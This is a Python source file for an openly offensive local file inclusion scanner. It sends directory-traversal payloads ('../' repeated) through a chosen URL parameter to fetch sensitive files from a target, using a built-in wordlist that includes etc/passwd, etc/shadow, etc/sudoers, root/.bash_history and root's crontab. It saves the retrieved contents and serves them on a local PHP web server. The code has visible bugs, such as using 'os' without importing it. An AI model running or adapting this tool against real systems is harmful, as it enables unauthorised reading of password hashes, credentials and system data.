from termcolor import *
from os import path
from multiprocessing import Process, Queue, Pool
from bs4 import BeautifulSoup
import requests, re, subprocess
import argparse, cursor, sys, pathlib, filecmp
import http.server, socketserver, threading, hashlib

class Error(Exception):
	"""Base class for other exceptions"""
	pass

class UrlRegexError(Error):
	"""Thrown when URL doesn't match required format"""
	pass

def cleanup():
	print("\n")
	cursor.show()

def startWebServer(port):
	PORT = port
	WEB_DIR = pathlib.Path("web").absolute()

	print(f"\nWebserver running on localhost:{PORT}...\n")

	with subprocess.Popen([f"php -S localhost:{PORT} -t {WEB_DIR}"],
							 stdout=subprocess.PIPE,
							 shell = True) as webHandle:
							 print(f"\n{webHandle.stdout.read()}\n")

def main():
	def gethash(dir):
		hashes = {}

		for dir in pathlib.Path("web/200").iterdir():
			#print(dir)
			hash = hashlib.md5(pathlib.Path(dir).read_bytes()).hexdigest()
			hashes[str(dir)] = hash
		return hashes

	cprint("\nFormating of wordlists should be like the following for each line: ", "cyan", attrs=["bold", "underline"])
	cprint("adir/anotherdir", "green", end="")
	cprint("  NOT  ", "cyan", attrs=["bold"], end="")
	cprint("/adir/anotherdir\n", "red")
	status200 = []
	default_dirs = [
		'home',
		'opt',
		'webapp',
		'wordpress',
		'templates',
		'etc/issue',
		'etc/profile',
		'etc/passwd',
		'etc/shadow',
		'etc/sudoers',
		'etc/systemd/system',
		'etc/php',
		'var/log/dmessage',
		'var/mail/root',
		'var/spool/cron/crontabs/root',
		'var/www/html',
		'root/.bash_history',
		'proc/version',
		'klocka/index.php'
	]
	wlist = []

	parser = argparse.ArgumentParser(description="Find LFI vulnerabilities")
	parser.add_argument("-u", "--url", required=True, type=str, help="url to test for LFI vulns")
	parser.add_argument("-p", "--param", required=True, help="parameter to use, http://10.10.36.16/article?NAME=lfiattack, NAME is the parameter")
	parser.add_argument("-w", "--wordlist", required=False, default=default_dirs, type=str, help="wordlist to use for directory checking [default = apachebuiltin]")
	parser.add_argument("-i", "--iterations", required=False, default=10, type=int, help="amount of times to move down the directory before testing the next directory [default = 10]")
	args = parser.parse_args()

	url = args.url
	param = args.param
	wordlist = args.wordlist
	iterations = args.iterations

	successFile = open("200.txt", "w+")

	index = 0
	i = 0

	attempts = 0
	success = 0
	failed = 0

	if re.search("^http://.*/.", url) or re.search("^https://.*/.", url):
		if wordlist != default_dirs:
			with open(wordlist, "r") as file:
				for lines in file:
					wlist.append(lines.strip("\n"))
			file.close()
			list_to_use = wlist
		else:
			list_to_use = default_dirs

		original_hashes = gethash("web/200")

		print("")
		while i < iterations:
			cursor.hide()

			params = {
				param : f"{'../'*i+list_to_use[index]}"
			}

			response = requests.get(url, params = params)

			if(response.status_code == 200 and "Warning" not in response.text and "warning" not in response.text):
				success += 1

				status200.append(response.text)

				successFile.write("{}".format('\n' + '*' * 50 + " " + url+params[param] + " START " + '*' * 50 + '\n'))
				successFile.write(response.text)
				successFile.write("{}".format('\n' + '*' * 50 + " " + url+params[param] + " END " + '*' * 50 + '\n'))

				decoded_html = BeautifulSoup(response.text, "lxml").text
				filecount = 0
				for path in pathlib.Path("web/200").iterdir():
					if path.is_file():
						filecount += 1

				if filecount > 0:
					fileIndex = filecount + 1
					newFileName = "File" + str(fileIndex) + ".txt"

					if os.path.isfile("web/200/" + newFileName):
						fileIndex = 0
						while os.path.isfile("web/200/" + newFileName):
							fileIndex += 1
							newFileName = "File" + str(fileIndex) + ".txt"

					newfile = open("web/200/"+newFileName, "w")
					newfile.write(decoded_html)
					newfile.close()
				else:
					fileIndex = 1
					newFileName = "File" + str(fileIndex) + ".txt"

					newfile = open("web/200/"+newFileName, "w")
					newfile.write(decoded_html)
					newfile.close()

				new_hashes = gethash("web/200")

				originalLen = len(original_hashes)
				dict = new_hashes

				for iterations in range(originalLen):
					dict.pop("this", None)
					#print(dict)

				for hash_key, hash_value in dict.items():
					for old_hash_key, old_hash_value in original_hashes.items():
						if hash_key == old_hash_key and os.path.isfile(newfile.name):
							os.remove(newfile.name)

				completestr = colored(f"{failed} [-] 500/unknown", "red", attrs=["bold"]) + colored(f" | {params[param]} | ", "cyan", attrs=["bold"])+ colored(f"{success} [+] 200", "green", attrs=["bold"])

				file_exists = os.path.isfile("web/urls.txt")
				if file_exists:
					urlFile = open("web/urls.txt", "a")
					urlFile.write(f"<a href='{response.url}'>((({params[param]}))) :: {url+params[param]}</a>\n")
					urlFile.close()
				else:
					urlFile = open("web/urls.txt", "w+")
					urlFile.write(f"<a href='{response.url}'>((({params[param]}))) :: {url+params[param]}</a>\n")
					urlFile.close()

				if index == len(list_to_use) - 1:
					break
				else:
					index += 1

				i = 0
			else:
				failed += 1
				i += 1
				completestr = colored(f"{failed} [-] 500/unknown", "red", attrs=["bold"]) + colored(f" | {params[param]} | ", "cyan", attrs=["bold"])+ colored(f"{success} [+] 200", "green", attrs=["bold"])
			attempts += 1
			if i == iterations:
				if index == len(list_to_use) - 1:
					break
				else:
					index += 1
				i = 0
			sys.stdout.write('\033[2K\033[1G')
			print(f"\r{completestr}", end="")
		sys.stdout.write('\033[2K\033[1G')
		cursor.show()

		print(f"\r{completestr}", end="\n")

		if len(status200) > 0:
			cprint(f"\n{str(success)+'/'+str(attempts + 1)} returned 200, open file 200.txt for found data or use the web interface!\n", "magenta", attrs=["bold"])
		else:
			cprint(f"\nNothing found, previous data is still on the web interface!\n", "red", attrs=["bold"])
			os.remove("200.txt")

		webworker = threading.Thread(target=startWebServer, args=(7777,))
		webworker.start()
	else:
		raise UrlRegexError

if __name__ ==  '__main__':
	try:
		MainThread = threading.Thread(target=main, args=())
		MainThread.start()
	except:
		cleanup()
